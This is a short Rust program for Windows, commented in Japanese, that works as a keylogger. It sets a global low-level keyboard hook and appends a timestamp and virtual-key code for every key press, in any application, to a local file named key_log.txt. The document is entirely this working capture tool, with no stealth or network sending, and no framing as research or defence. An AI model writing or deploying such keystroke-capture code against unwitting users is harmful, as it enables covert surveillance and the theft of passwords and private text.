use chrono::Local;
use std::fs::OpenOptions;
use std::io::Write;
use windows::Win32::Foundation::*;
use windows::Win32::UI::WindowsAndMessaging::*;

unsafe extern "system" fn keyboard_proc(code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if code >= 0 {
        if w_param.0 == WM_KEYDOWN as usize {
            // `l_param`を適切に型変換して、KBDLLHOOKSTRUCTのポインタを取得
            let kb_struct: &KBDLLHOOKSTRUCT = &*(l_param.0 as *const KBDLLHOOKSTRUCT);
            let key_code = kb_struct.vkCode;

            // 現在時刻とキーの情報をログに書き込む
            let now = Local::now();
            let log_entry = format!(
                "{}: Key code: {}\n",
                now.format("%Y-%m-%d %H:%M:%S"),
                key_code
            );
            log_key(log_entry);
        }
    }
    CallNextHookEx(None, code, w_param, l_param)
}

fn log_key(entry: String) {
    let mut file = OpenOptions::new()
        .append(true)
        .create(true)
        .open("key_log.txt")
        .expect("Unable to open file");

    file.write_all(entry.as_bytes())
        .expect("Unable to write data");
}
fn main() {
    unsafe {
        // フックを設定し、結果が `Result<HHOOK, Error>` で返ってくる
        let hook = SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), None, 0);
        if let Ok(hhook) = hook {
            // フックが設定できた場合のみメッセージループに入る
            let mut msg = MSG::default();
            while GetMessageW(&mut msg, None, 0, 0).into() {
                let _ = TranslateMessage(&msg);
                DispatchMessageW(&msg);
            }

            // フックを解除する
            let _ = UnhookWindowsHookEx(hhook);
        } else {
            eprintln!("Failed to set hook");
        }
    }
}
